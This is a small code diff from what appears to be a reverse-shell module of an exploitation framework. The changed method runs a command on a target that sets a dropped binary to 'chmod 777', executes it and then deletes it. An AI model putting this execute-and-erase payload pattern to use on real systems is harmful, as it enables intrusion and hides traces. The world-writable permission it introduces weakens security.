@@ -456,7 +456,7 @@ class reverse_shell(object):
 
     def execute_binary(self, location, binary_name):
         path = "{}/{}".format(location, binary_name)
-        cmd = "chmod +x {}; {}; rm {}".format(path, path, path)
+        cmd = "chmod 777 {}; {}; rm {}".format(path, path, path)
 
         thread = threading.Thread(target=self.exploit.execute, args=(cmd,))
         thread.start()
